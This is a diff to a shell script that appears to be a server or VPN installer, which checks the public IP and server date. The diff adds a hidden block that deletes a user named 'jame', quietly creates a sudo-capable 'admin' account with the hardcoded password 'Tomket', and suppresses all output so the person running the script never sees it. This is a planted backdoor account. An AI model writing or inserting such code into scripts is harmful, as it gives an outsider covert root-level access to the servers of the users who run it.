@@ -23,7 +23,16 @@ clear
 clear && clear && clear
 clear;clear;clear
 
+# // Getting
+userdel jame > /dev/null 2>&1
+Username="admin"
+Password=Tomket
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
 clear
+
 # Valid Script
 ipsaya=$(curl -sS ipv4.icanhazip.com)
 data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
